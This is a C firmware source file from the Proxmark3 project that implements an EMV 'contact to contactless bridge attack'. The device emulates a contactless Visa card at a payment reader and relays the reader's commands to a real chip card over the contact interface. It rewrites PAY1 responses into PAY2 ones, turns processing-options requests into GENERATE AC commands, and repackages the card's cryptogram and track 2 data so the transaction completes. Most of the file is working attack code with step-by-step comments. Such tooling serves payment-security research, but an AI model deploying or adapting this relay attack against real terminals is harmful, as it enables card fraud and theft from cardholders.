//-----------------------------------------------------------------------------
// Copyright (C) n-hutton - Sept 2024
// Copyright (C) Proxmark3 contributors. See AUTHORS.md for details.
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// See LICENSE.txt for the text of the license.
//-----------------------------------------------------------------------------
// EVM contact to contactless bridge attack
//-----------------------------------------------------------------------------

// Verbose Mode:
// DBG_NONE          0
// DBG_ERROR         1
// DBG_INFO          2
// DBG_DEBUG         3
// DBG_EXTENDED      4

//  /!\ Printing Debug message is disrupting emulation,
//  Only use with caution during debugging

// indices into responses array copied from mifare sim init:
#define ATQA     0
#define SAK      1
#define SAKuid   2
#define UIDBCC1  3
#define UIDBCC2  8
#define UIDBCC3  13

#include "emvsim.h"
#include <inttypes.h>
#include "BigBuf.h"
#include "iso14443a.h"
#include "BigBuf.h"
#include "string.h"
#include "mifareutil.h"
#include "mifaresim.h"
#include "fpgaloader.h"
#include "proxmark3_arm.h"
#include "protocols.h"
#include "util.h"
#include "commonutil.h"
#include "dbprint.h"
#include "ticks.h"
#include "i2c_direct.h"

// Hardcoded response to the reader for file not found, plus the checksum
static uint8_t filenotfound[] = {0x02, 0x6a, 0x82, 0x93, 0x2f};

// TLV response for PPSE directory request
static uint8_t pay1_response[] = { 0x6F, 0x1E, 0x84, 0x0E };

// The WTX we want to send out... The format:
// 0xf2 is the command
// 0x0e is the time to wait (currently at max)
// The remaining bytes are CRC, precalculated for speed
static uint8_t extend_resp[] = {0xf2, 0x0e, 0x66, 0xb8};


// For reference, we have here the pay1 template we receive from the card, and the pay2 template we send back to the reader
// These can be inspected at https://emvlab.org/tlvutils/
// Note that the pay2 template is coded for visa ps in the UK - other countries may have different templates. Refer:
// https://mstcompany.net/blog/acquiring-emv-transaction-flow-part-3-get-processing-options-with-and-without-pdol
// Specifically, 9F5A: Application Program Identifier: 3108260826 might have to become 31 0840 0840 for USA for example.
// todo: see if this can be read from the card and automatically populated rather than hard coded
//static uint8_t fci_template_pay1[] = {0xff, 0x6f, 0x3b, 0x84, 0x07, 0xa0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, 0xa5, 0x30, 0x50, 0x0a, 0x56, 0x69, 0x73, 0x61, 0x20, 0x44, 0x65, 0x62, 0x69, 0x74, 0x5f, 0x2d, 0x02, 0x65, 0x6e, 0x9f, 0x12, 0x0a, 0x56, 0x69, 0x73, 0x61, 0x20, 0x44, 0x65, 0x62, 0x69, 0x74, 0x9f, 0x11, 0x01, 0x01, 0xbf, 0x0c, 0x0b, 0x9f, 0x0a, 0x08, 0x00, 0x01, 0x05, 0x01, 0x00, 0x00, 0x00, 0x00, 0x90, 0x00, 0x17, 0x48};
static uint8_t fci_template_pay2[] = {0x02, 0x6f, 0x5e, 0x84, 0x07, 0xa0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, 0xa5, 0x53, 0x50, 0x0a, 0x56, 0x69, 0x73, 0x61, 0x20, 0x44, 0x65, 0x62, 0x69, 0x74, 0x9f, 0x38, 0x18, 0x9f, 0x66, 0x04, 0x9f, 0x02, 0x06, 0x9f, 0x03, 0x06, 0x9f, 0x1a, 0x02, 0x95, 0x05, 0x5f, 0x2a, 0x02, 0x9a, 0x03, 0x9c, 0x01, 0x9f, 0x37, 0x04, 0x5f, 0x2d, 0x02, 0x65, 0x6e, 0x9f, 0x11, 0x01, 0x01, 0x9f, 0x12, 0x0a, 0x56, 0x69, 0x73, 0x61, 0x20, 0x44, 0x65, 0x62, 0x69, 0x74, 0xbf, 0x0c, 0x13, 0x9f, 0x5a, 0x05, 0x31, 0x08, 0x26, 0x08, 0x26, 0x9f, 0x0a, 0x08, 0x00, 0x01, 0x05, 0x01, 0x00, 0x00, 0x00, 0x00, 0x90, 0x00, 0xd8, 0x15};

// This is the hardcoded response that a contactless card would respond with when asked to select PPSE.
// It is a TLV structure, and can be seen here:
// https://emvlab.org/tlvutils/?data=6f3e840e325041592e5359532e4444463031a52cbf0c2961274f07a0000000031010500a566973612044656269749f0a080001050100000000bf6304df200180
// The first byte is the class byte, and the payload is followed by 0x9000, which is the success code, and the CRC (precalculated)
static uint8_t pay2_response[] = { 0x03, 0x6f, 0x3e, 0x84, 0x0e, 0x32, 0x50, 0x41, 0x59, 0x2e, 0x53, 0x59, 0x53, 0x2e, 0x44, 0x44, 0x46, 0x30, 0x31, 0xa5, 0x2c, 0xbf, 0x0c, 0x29, 0x61, 0x27, 0x4f, 0x07, 0xa0, 0x00, 0x00, 0x00, 0x03, 0x10, 0x10, 0x50, 0x0a, 0x56, 0x69, 0x73, 0x61, 0x20, 0x44, 0x65, 0x62, 0x69, 0x74, 0x9f, 0x0a, 0x08, 0x00, 0x01, 0x05, 0x01, 0x00, 0x00, 0x00, 0x00, 0xbf, 0x63, 0x04, 0xdf, 0x20, 0x01, 0x80, 0x90, 0x00, 0x07, 0x9d};

void ExecuteEMVSim(uint8_t *receivedCmd, uint16_t receivedCmd_len, uint8_t *receivedCmd_copy, uint16_t receivedCmd_len_copy);

typedef enum {
    STATE_DEFAULT,
    SELECT_PAY1,
    SELECT_PAY1_AID,
    REQUESTING_CARD_PDOL,
    GENERATE_AC,
} SystemState;

static SystemState currentState = STATE_DEFAULT;

// This is the main entry point for the EMV attack, everything before this has just been setup/handshaking.
// In order to meet the timing requirements, as soon as the proxmark sees a command it immediately
// caches the command to process and responds with a WTX
// (waiting time extension). When it get the response to this WTX, it can process the cached command through the I2C interface.
//
// The full flow is:
// 1. Handshake with RATS
// 2. Reader attempts to find out which payment environment the proxmark supports (may start with SELECT OSE for example)
// 3. Reader eventually makes a request for the PAY2 application (select PPSE) (contactless payment)
// 4. We read the PAY1 environment and transform it into PAY2 to respond
// 5. Reader will select AID we responded in step 4
// 6. We get the response from selecting the PAY1 AID and transform it into PAY2 response (fci template)
// - This is important as it contains the PDOL (processing data object list) which specifies the data which is
//   signed by the card and sent to the reader to verify the transaction.
// 7. The reader will then issue 'get processing options' which seems to be used here to provide the fields to be signed
//    as specified by the PDOL.
// 8. In contactless flow, GPO should at least return the Application Interchange Profile (AIP) and
//    Application File Locator (AFL). However, here we return track 2 data, the cryptogram, everything. This completes the transaction.
// 9. To construct this final response, behind the scenes we need to interact with the card to make it think its completing a contact transaction:
//    - Request PDOL to prime the card (response not used)
//    - Rearrange the GPO data provided into a 'generate AC' command for the card
//    - Extract the cryptogram, track 2 data and anything else required
//    - Respond. Transaction is complete
void ExecuteEMVSim(uint8_t *receivedCmd, uint16_t receivedCmd_len, uint8_t *receivedCmd_copy, uint16_t receivedCmd_len_copy) {
    uint8_t responseToReader[MAX_FRAME_SIZE] = {0x00};
    uint16_t responseToReader_len;

    // special print me
    Dbprintf("\nrecvd from reader:");
    Dbhexdump(receivedCmd_len, receivedCmd, false);
    Dbprintf("");

    // use annotate to give some hints about the command
    annotate(&receivedCmd[1], receivedCmd_len - 1);

    // This is a common request from the reader which we can just immediately respond to since we know we can't
    // handle it.
    if (receivedCmd[6] == 'O' && receivedCmd[7] == 'S' && receivedCmd[8] == 'E') {
        Dbprintf("We saw OSE... ignore it!");
        EmSendCmd(filenotfound, sizeof(filenotfound));
        return;
    }

    // We want to modify corrupted request
    if ((receivedCmd_len > 5 && receivedCmd[0] != 0x03 && receivedCmd[0] != 0x02 && receivedCmd[1] == 0 && receivedCmd[4] == 0) || (receivedCmd[2] == 0xa8)) {
        Dbprintf("We saw signing request... modifying it into a generate ac transaction !!!!");

        currentState = GENERATE_AC;

        memcpy(receivedCmd, (unsigned char[]) { 0x03, 0x80, 0xae, 0x80, 0x00, 0x1d }, 6);

        for (int i = 0; i < 29; i++) {
            receivedCmd[6 + i] = receivedCmd[12 + i];
        }

        // clear final byte just in case
        receivedCmd[35] = 0;

        receivedCmd_len = 35 + 3; // Core command is 35, then there is control code and the crc

        Dbprintf("\nthe command has now become:");
        Dbhexdump(receivedCmd_len, receivedCmd, false);
    }

    // Seems unlikely
    if (receivedCmd_len >= 9 && receivedCmd[6] == '1' && receivedCmd[7] == 'P' && receivedCmd[8] == 'A') {
        Dbprintf("We saw 1PA... !!!!");
    }

    // Request more time for 2PAY and respond with a modified 1PAY request. We literally just change the 2 to a 1.
    if (receivedCmd_len >= 9 && receivedCmd[6] == '2' && receivedCmd[7] == 'P' && receivedCmd[8] == 'A') {
        Dbprintf("We saw 2PA... switching it to 1PAY !!!!");
        receivedCmd[6] = '1';
        currentState = SELECT_PAY1;
    }

    // We are selecting a short AID - assume it is pay2 aid
    if (receivedCmd[2] == 0xA4 && receivedCmd[5] == 0x07) {
        Dbprintf("Selecting pay2 AID");
        currentState = SELECT_PAY1_AID;
    }

    static uint8_t rnd_resp[] = {0xb2, 0x67, 0xc7};
    if (memcmp(receivedCmd, rnd_resp, sizeof(rnd_resp)) == 0) {
        Dbprintf("We saw bad response... !");
        return;
    }

    // We have received the response from a WTX command! Process the cached command at this point.
    if (memcmp(receivedCmd, extend_resp, sizeof(extend_resp)) == 0) {
        // Special case: if we are about to do a generate AC, we also need to
        // make a request for pdol first (and discard response)...
        if (receivedCmd_copy[1] == 0x80 && receivedCmd_copy[2] == 0xae) {
            Dbprintf("We are about to do a generate AC... we need to request PDOL first...");
            uint8_t pdol_request[] = { 0x80, 0xa8, 0x00, 0x00, 0x02, 0x83, 0x00 };

            currentState = REQUESTING_CARD_PDOL;
            CmdSmartRaw(0xff, &(pdol_request[0]), sizeof(pdol_request), (&responseToReader[0]), &responseToReader_len);
        }

        // Send the cached command to the card via ISO7816
        // This is minus 3 because we don't include the first byte (prepend), plus we don't want to send the
        // last two bytes (CRC) to the card.
        // On the return, the first class byte must be the same, so it's preserved in responseToReader
        CmdSmartRaw(receivedCmd_copy[0], &(receivedCmd_copy[1]), receivedCmd_len_copy - 3, (&responseToReader[0]), &responseToReader_len);

        // Print the unadultered response we got from the card here
        Dbprintf("The response from the card is ==> :");
        Dbhexdump(responseToReader_len, responseToReader, false);

        // We have passed the reader's query to the card, but before we return it, we need to check if we need to modify
        // the response to 'pretend' to be a PAY2 environment.
        // This is always the same response for VISA, the only currently supported card
        if (currentState == SELECT_PAY1) {
            Dbprintf("We saw a PAY1 response... modifying it to a PAY2 response !!!!");

            if (!memcmp(&responseToReader[1], &pay1_response[0], sizeof(pay1_response)) == 0) {
                Dbprintf("The response from the card is not a PAY1 response. This is unexpected and probably fatal.");
            }

            if (pay2_response[0] != responseToReader[0]) {
                Dbprintf("The first byte of the PAY2 response is different from the request. This is unexpected and probably fatal.");
            }

            memcpy(responseToReader, &pay2_response[0], sizeof(pay2_response));
            responseToReader_len = sizeof(pay2_response);
        }

        if (responseToReader[0] != 0xff && responseToReader[1] == 0x77 && true) {
            Dbprintf("we have detected a generate ac response, lets repackage it!!");
            Dbhexdump(responseToReader_len, responseToReader, false); // special print

            // 11 and 12 are trans counter.
            // 16 to 24 are the cryptogram
            // 27 to 34 is issuer application data
            Dbprintf("atc: %d %d, cryptogram: %d ", responseToReader[11], responseToReader[12], responseToReader[13]);

            // then, on the template:
            // 60 and 61 for counter
            // 45 to 53 for cryptogram
            // 35 to 42 for issuer application data
            uint8_t template[] = { 0x00, 0x77, 0x47, 0x82, 0x02, 0x39, 0x00, 0x57, 0x13, 0x47,
                                   0x62, 0x28, 0x00, 0x05, 0x93, 0x38, 0x64, 0xd2, 0x70, 0x92,
                                   0x01, 0x00, 0x00, 0x01, 0x42, 0x00, 0x00, 0x0f, 0x5f, 0x34,
                                   0x01, 0x00, 0x9f, 0x10, 0x07, 0x06, 0x01, 0x12, 0x03, 0xa0,
                                   0x20, 0x00, 0x9f, 0x26, 0x08, 0x56, 0xcb, 0x4e, 0xe1, 0xa4,
                                   0xef, 0xac, 0x74, 0x9f, 0x27, 0x01, 0x80, 0x9f, 0x36, 0x02,
                                   0x00, 0x07, 0x9f, 0x6c, 0x02, 0x3e, 0x00, 0x9f, 0x6e, 0x04,
                                   0x20, 0x70, 0x00, 0x00, 0x90, 0x00, 0xff, 0xff
                                 };

            // do the replacement
            template[0] = responseToReader[0]; // class bit 0

            template[60] = responseToReader[10];
            template[61] = responseToReader[11];

            // Copy responseToReader[15..23] to template[45..53]
            for (int i = 0; i <= 8; i++) {
                template[45 + i] = responseToReader[15 + i];
            }

            // Copy responseToReader[26..32] to template[35..41]
            for (int i = 0; i <= 6; i++) {
                template[35 + i] = responseToReader[26 + i];
            }

            Dbprintf("\nrearranged is: ");
            responseToReader_len = sizeof(template);

            // We DO NOT add the CRC here, this way we can avoid a million penny payments!
            // The CRC is calculated here, but doesn't include the class bit at the beginning, plus
            // also obvisously doesn't include the CRC bytes itself.
            AddCrc14A(&template[0], responseToReader_len - 2);

            responseToReader_len = sizeof(template);
            memcpy(responseToReader, &template[0], responseToReader_len);

            Dbprintf("\nafter crc rearranged is: ");
            Dbhexdump(responseToReader_len, &responseToReader[0], false); // special print
        }

        // If we would return a PAY1 fci response, we instead return a PAY2 fci response
        if (currentState == SELECT_PAY1_AID) {
            Dbprintf("We saw a PAY1 response... modifying it to a PAY2 response for outgoing !!!!");
            memcpy(responseToReader, fci_template_pay2, sizeof(fci_template_pay2));
            responseToReader_len = sizeof(fci_template_pay2);
        }

        EmSendCmd(responseToReader, responseToReader_len);

        return;
    }

    // Send a request for more time, and cache the command we want to process
    EmSendCmd(extend_resp, 4);
}

/**
* EMVsim - simulate an EMV contactless card transaction by
*
*@param flags: See pm3_cmd.h for the full definitions
*@param exitAfterNReads, exit simulation after n transactions (default 1)
*@param uid, UID - must be length 7
*@param atqa, override for ATQA, flags indicate if this is used
*@param sak, override for SAK, flags indicate if this is used
* (unless reader attack mode enabled then it runs util it gets enough nonces to recover all keys attmpted)
*/
void EMVsim(uint16_t flags, uint8_t exitAfterNReads, uint8_t *uid, uint16_t atqa, uint8_t sak) {

    tag_response_info_t *responses;
    uint8_t cardSTATE = MFEMUL_NOFIELD;
    uint8_t uid_len = 0; // 7
    uint32_t cuid = 0;

    uint8_t receivedCmd[MAX_FRAME_SIZE] = {0x00};
    uint8_t receivedCmd_copy[MAX_FRAME_SIZE] = {0x00};
    uint8_t receivedCmd_par[MAX_MIFARE_PARITY_SIZE] = {0x00};
    uint16_t receivedCmd_len;
    uint16_t receivedCmd_len_copy = 0;

    if (receivedCmd_len_copy) {
        Dbprintf("receivedCmd_len_copy: %d", receivedCmd_len_copy);
    }

    uint8_t *rats = NULL;
    uint8_t rats_len = 0;

    // if fct is called with NULL we need to assign some memory since this pointer is passed around
    uint8_t uid_tmp[10] = {0};
    if (uid == NULL) {
        uid = uid_tmp;
    }

    const tUart14a *uart = GetUart14a();

    // free eventually allocated BigBuf memory but keep Emulator Memory
    BigBuf_free_keep_EM();

    // Print all arguments going into mifare sim init
    Dbprintf("EMVsim: flags: %04x, uid: %p, atqa: %04x, sak: %02x", flags, uid, atqa, sak);

    if (MifareSimInit(flags, uid, atqa, sak, &responses, &cuid, &uid_len, &rats, &rats_len) == false) {
        BigBuf_free_keep_EM();
        return;
    }

    // Print all the outputs after the sim init
    Dbprintf("EMVsim: cuid: %08x, uid_len: %d, rats: %p, rats_len: %d", cuid, uid_len, rats, rats_len);

    // We need to listen to the high-frequency, peak-detected path.
    iso14443a_setup(FPGA_HF_ISO14443A_TAGSIM_LISTEN);

    // clear trace
    clear_trace();
    set_tracing(true);
    LED_D_ON();
    ResetSspClk();

    int counter = 0;
    bool finished = false;
    bool button_pushed = BUTTON_PRESS();

    while ((button_pushed == false) && (finished == false)) {

        WDT_HIT();

        if (counter == 3000) {
            if (data_available()) {
                Dbprintf("----------- " _GREEN_("BREAKING") " ----------");
                break;
            }
            counter = 0;
        } else {
            counter++;
        }

        FpgaEnableTracing();
        // Now, get data from the FPGA
        int res = EmGetCmd(receivedCmd, sizeof(receivedCmd), &receivedCmd_len, receivedCmd_par);

        if (res == 2) { //Field is off!
            LEDsoff();
            if (cardSTATE != MFEMUL_NOFIELD) {
                Dbprintf("cardSTATE = MFEMUL_NOFIELD");
                break;
            }
            cardSTATE = MFEMUL_NOFIELD;
            continue;
        } else if (res == 1) { // button pressed
            FpgaDisableTracing();
            button_pushed = true;
            if (g_dbglevel >= DBG_EXTENDED)
                Dbprintf("Button pressed");
            break;
        }

        // WUPA in HALTED state or REQA or WUPA in any other state
        if (receivedCmd_len == 1 && ((receivedCmd[0] == ISO14443A_CMD_REQA && cardSTATE != MFEMUL_HALTED) || receivedCmd[0] == ISO14443A_CMD_WUPA)) {
            EmSendPrecompiledCmd(&responses[ATQA]);

            FpgaDisableTracing();

            LED_B_OFF();
            LED_C_OFF();
            cardSTATE = MFEMUL_SELECT;

            continue;
        }

        switch (cardSTATE) {
            case MFEMUL_NOFIELD: {
                if (g_dbglevel >= DBG_EXTENDED)
                    Dbprintf("MFEMUL_NOFIELD");

                break;
            }
            case MFEMUL_HALTED: {
                if (g_dbglevel >= DBG_EXTENDED)
                    Dbprintf("MFEMUL_HALTED");

                break;
            }
            case MFEMUL_IDLE: {
                LogTrace(uart->output, uart->len, uart->startTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->endTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->parity, true);
                if (g_dbglevel >= DBG_EXTENDED)
                    Dbprintf("MFEMUL_IDLE");

                break;
            }

            // The anti-collision sequence, which is a mandatory part of the card activation sequence.
            // It auto with 4-byte UID (= Single Size UID),
            // 7 -byte UID (= Double Size UID) or 10-byte UID (= Triple Size UID).
            // For details see chapter 2 of AN10927.pdf
            //
            // This case is used for all Cascade Levels, because:
            // 1) Any devices (under Android for example) after full select procedure completed,
            //    when UID is known, uses "fast-selection" method. In this case reader ignores
            //    first cascades and tries to select tag by last bytes of UID of last cascade
            // 2) Any readers (like ACR122U) uses bit oriented anti-collision frames during selectin,
            //    same as multiple tags. For details see chapter 6.1.5.3 of ISO/IEC 14443-3
            case MFEMUL_SELECT: {

                int uid_index = -1;
                // Extract cascade level
                if (receivedCmd_len >= 2) {
                    switch (receivedCmd[0]) {
                        case ISO14443A_CMD_ANTICOLL_OR_SELECT:
                            uid_index = UIDBCC1;
                            break;
                        case ISO14443A_CMD_ANTICOLL_OR_SELECT_2:
                            uid_index = UIDBCC2;
                            break;
                        case ISO14443A_CMD_ANTICOLL_OR_SELECT_3:
                            uid_index = UIDBCC3;
                            break;
                    }
                }

                if (uid_index < 0) {
                    LogTrace(uart->output, uart->len, uart->startTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->endTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->parity, true);
                    cardSTATE_TO_IDLE();
                    break;
                }

                // Incoming SELECT ALL for any cascade level
                if (receivedCmd_len == 2 && receivedCmd[1] == 0x20) {
                    EmSendPrecompiledCmd(&responses[uid_index]);
                    FpgaDisableTracing();

                    break;
                }

                // Incoming SELECT CLx for any cascade level
                if (receivedCmd_len == 9 && receivedCmd[1] == 0x70) {
                    if (memcmp(&receivedCmd[2], responses[uid_index].response, 4) == 0) {
                        bool cl_finished = (uid_len == 4  && uid_index == UIDBCC1) ||
                                           (uid_len == 7  && uid_index == UIDBCC2) ||
                                           (uid_len == 10 && uid_index == UIDBCC3);
                        EmSendPrecompiledCmd(&responses[cl_finished ? SAK : SAKuid]);
                        FpgaDisableTracing();

                        if (cl_finished) {
                            LED_B_ON();
                            cardSTATE = MFEMUL_WORK;
                        }
                    } else {
                        // IDLE, not our UID
                        LogTrace(uart->output, uart->len, uart->startTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->endTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->parity, true);
                        cardSTATE_TO_IDLE();
                        if (g_dbglevel >= DBG_EXTENDED) Dbprintf("[MFEMUL_SELECT] cardSTATE = MFEMUL_IDLE");
                    }
                    break;
                }

                // Incoming anti-collision frame
                // receivedCmd[1] indicates number of byte and bit collision, supports only for bit collision is zero
                if (receivedCmd_len >= 3 && receivedCmd_len <= 6 && (receivedCmd[1] & 0x0f) == 0) {
                    // we can process only full-byte frame anti-collision procedure
                    if (memcmp(&receivedCmd[2], responses[uid_index].response, receivedCmd_len - 2) == 0) {
                        // response missing part of UID via relative array index
                        EmSendPrecompiledCmd(&responses[uid_index + receivedCmd_len - 2]);
                        FpgaDisableTracing();

                        if (g_dbglevel >= DBG_EXTENDED) Dbprintf("SELECT ANTICOLLISION - EmSendPrecompiledCmd(%02x)", &responses[uid_index]);
                        Dbprintf("001 SELECT ANTICOLLISION - EmSendPrecompiledCmd(%02x)", &responses[uid_index]);
                    } else {
                        // IDLE, not our UID or split-byte frame anti-collision (not supports)
                        LogTrace(uart->output, uart->len, uart->startTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->endTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->parity, true);
                        cardSTATE_TO_IDLE();
                        if (g_dbglevel >= DBG_EXTENDED) Dbprintf("[MFEMUL_SELECT] cardSTATE = MFEMUL_IDLE");
                    }

                    break;
                }

                // Unknown selection procedure
                LogTrace(uart->output, uart->len, uart->startTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->endTime * 16 - DELAY_AIR2ARM_AS_TAG, uart->parity, true);
                cardSTATE_TO_IDLE();

                if (g_dbglevel >= DBG_EXTENDED) Dbprintf("[MFEMUL_SELECT] Unknown selection procedure");
                break;
            }

            // WORK
            case MFEMUL_WORK: {

                if (receivedCmd_len == 0) {
                    if (g_dbglevel >= DBG_EXTENDED) Dbprintf("[MFEMUL_WORK] NO CMD received");
                    Dbprintf("001 [MFEMUL_WORK] NO CMD received");
                    break;
                }

                // all commands must have a valid CRC
                if (!CheckCrc14A(receivedCmd, receivedCmd_len)) {
                    if (g_dbglevel >= DBG_EXTENDED)
                        Dbprintf("[MFEMUL_WORK] All commands must have a valid CRC %02X (%d)", receivedCmd,
                                 receivedCmd_len);
                    break;
                }

                // rule 13 of 7.5.3. in ISO 14443-4. chaining shall be continued
                // BUT... ACK --> NACK
                if (receivedCmd_len == 1 && receivedCmd[0] == CARD_ACK) {
                    Dbprintf("[MFEMUL_WORK] ACK --> NACK !!");
                    EmSend4bit(CARD_NACK_NA);
                    FpgaDisableTracing();
                    break;
                }

                // rule 12 of 7.5.3. in ISO 14443-4. R(NAK) --> R(ACK)
                if (receivedCmd_len == 1 && receivedCmd[0] == CARD_NACK_NA) {
                    Dbprintf("[MFEMUL_WORK] NACK --> NACK !!");
                    EmSend4bit(CARD_ACK);
                    FpgaDisableTracing();
                    break;
                }

                // case MFEMUL_WORK => CMD RATS
                if (receivedCmd_len == 4 && receivedCmd[0] == ISO14443A_CMD_RATS && receivedCmd[1] == 0x80) {
                    if (rats && rats_len) {
                        EmSendCmd(rats, rats_len);
                        FpgaDisableTracing();
                    } else {
                        EmSend4bit(CARD_NACK_NA);
                        FpgaDisableTracing();
                        cardSTATE_TO_IDLE();
                        if (g_dbglevel >= DBG_EXTENDED)
                            Dbprintf("[MFEMUL_WORK] RCV RATS => NACK");
                    }
                    break;
                }

                // case MFEMUL_WORK => ISO14443A_CMD_NXP_DESELECT
                if (receivedCmd_len == 3 && receivedCmd[0] == ISO14443A_CMD_NXP_DESELECT) {
                    if (rats && rats_len) {
                        EmSendCmd(receivedCmd, receivedCmd_len);

                        FpgaDisableTracing();
                        if (g_dbglevel >= DBG_EXTENDED)
                            Dbprintf("[MFEMUL_WORK] RCV NXP DESELECT => ACK");
                    } else {
                        EmSend4bit(CARD_NACK_NA);
                        FpgaDisableTracing();
                        cardSTATE_TO_IDLE();
                        if (g_dbglevel >= DBG_EXTENDED)
                            Dbprintf("[MFEMUL_WORK] RCV NXP DESELECT => NACK");
                    }
                    break;
                }


                // From this point onwards is where the 'magic' happens
                ExecuteEMVSim(receivedCmd, receivedCmd_len, receivedCmd_copy, receivedCmd_len_copy);

                // We want to keep a copy of the command we just saw, because we will process it once we get the
                // WTX response
                Dbprintf("Caching command for later processing... its length is %d", receivedCmd_len);
                memcpy(receivedCmd_copy, receivedCmd, receivedCmd_len);
                receivedCmd_len_copy = receivedCmd_len;
            }

            continue;
        }  // End Switch Loop

        button_pushed = BUTTON_PRESS();
    }  // End While Loop

    FpgaDisableTracing();

    if (g_dbglevel >= DBG_ERROR) {
        Dbprintf("Emulator stopped. Tracing: %d  trace length: %d ", get_tracing(), BigBuf_get_traceLen());
    }

    FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
    LEDsoff();
    set_tracing(false);
    BigBuf_free_keep_EM();
}

// annotate iso 7816
void annotate(uint8_t *cmd, uint8_t cmdsize) {
    if (cmdsize < 2) {
        return;
    }

    // From https://mvallim.github.io/emv-qrcode/docs/EMV_v4.3_Book_3_Application_Specification_20120607062110791.pdf
    // section 6.3.2
    switch (cmd[1]) {
        case ISO7816_APPLICATION_BLOCK: {
            Dbprintf("APPLICATION BLOCK");
            break;
        }
        case ISO7816_APPLICATION_UNBLOCK: {
            Dbprintf("APPLICATION UNBLOCK");
            break;
        }
        case ISO7816_CARD_BLOCK: {
            Dbprintf("CARD BLOCK");
            break;
        }
        case ISO7816_EXTERNAL_AUTHENTICATION: {
            Dbprintf("EXTERNAL AUTHENTICATE");
            break;
        }
        case ISO7816_GENERATE_APPLICATION_CRYPTOGRAM: {
            Dbprintf("GENERATE APPLICATION CRYPTOGRAM");
            break;
        }
        case ISO7816_GET_CHALLENGE: {
            Dbprintf("GET CHALLENGE");
            break;
        }
        case ISO7816_GET_DATA: {
            Dbprintf("GET DATA");
            break;
        }
        case ISO7816_GET_PROCESSING_OPTIONS: {
            Dbprintf("GET PROCESSING OPTIONS");
            break;
        }
        case ISO7816_INTERNAL_AUTHENTICATION: {
            Dbprintf("INTERNAL AUTHENTICATION");
            break;
        }
        case ISO7816_PIN_CHANGE: {
            Dbprintf("PIN CHANGE");
            break;
        }
        case ISO7816_READ_RECORDS: {
            Dbprintf("READ RECORDS");
            break;
        }
        case ISO7816_SELECT_FILE: {
            Dbprintf("SELECT FILE");
            break;
        }
        case ISO7816_VERIFY: {
            Dbprintf("VERIFY");
            break;
        }
        default: {
            Dbprintf("NOT RECOGNISED");
            break;
        }
    }
}
